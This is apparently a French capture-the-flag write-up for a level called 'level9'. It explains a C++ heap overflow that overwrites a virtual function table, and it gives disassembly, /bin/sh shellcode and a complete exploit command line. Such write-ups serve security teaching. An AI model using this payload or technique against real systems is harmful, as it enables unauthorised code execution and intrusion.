@@ -1,0 +1,52 @@
+On a ici un programme en c++
+On voit que le programme instancie
+2 objets N (qui ont l'air de stocker 1 int et
+une string)
+
+puis le programme copie argv[1] dans le premier
+objet sans verifier que cette string est plus petite
+que l'objet lui meme, on peut donc overflow
+sur la heap dans l'obj2
+
+Maintenant quoi injecter ?
+
+   0x0804867c <+136>:   mov    0x10(%esp),%eax
+   0x08048680 <+140>:   mov    (%eax),%eax
+   0x08048682 <+142>:   mov    (%eax),%edx
+   0x08048684 <+144>:   mov    0x14(%esp),%eax
+   0x08048688 <+148>:   mov    %eax,0x4(%esp)
+   0x0804868c <+152>:   mov    0x10(%esp),%eax
+   0x08048690 <+156>:   mov    %eax,(%esp)
+   0x08048693 <+159>:   call   *%edx
+
+on voit ces lignes a la fin, concretement, elles recuperent
+obj2, le dereferencie pour avoir son contenu, plus precisement
+sa vtable(table de fonction virtual) qui est stockee au debut
+de l'objet en memoire.
+Puis ils recuperent le premier element de la vtable, dans le 
+code une fonction operator+()
+
+via l'overflow, on peut donc modifier la vtable pour executer autre chose:
+
+adresse de obj2: 0x08040a78
+offset pour ecrire dans obj2: 108
+shellcode: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+(le shellcode est un shellcode classique executant /bin/sh,
+mais avec une instruction supplementaire remettant edx a NULL
+car dans la majorite des shellcode, il est suppose que edx est intacte
+alors qu'ici, la vtable est chargee dans edx precedemment, il
+faut donc le remettre a NULL pour que cela fonctionne)
+
+finalement, pour comprendre quoi ecrire:
+l'obj ressemble a cela
+debut: addresse->vtable autres addresses
+vtable: adresse->fonction1 autres_adresses->autres_fonctions
+
+on va donc ecrire au debut de obj2 notre nouvelle
+l'adresse de notre nouvelle vtable, qui
+contient comme premiere et seule adresse
+le debut de notre shellcode.
+
+
+input:
+/home/user/level9/level9 $(python -c 'print("A"*108 + "\x7c\xa0\x04\x08" + "\x80\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')
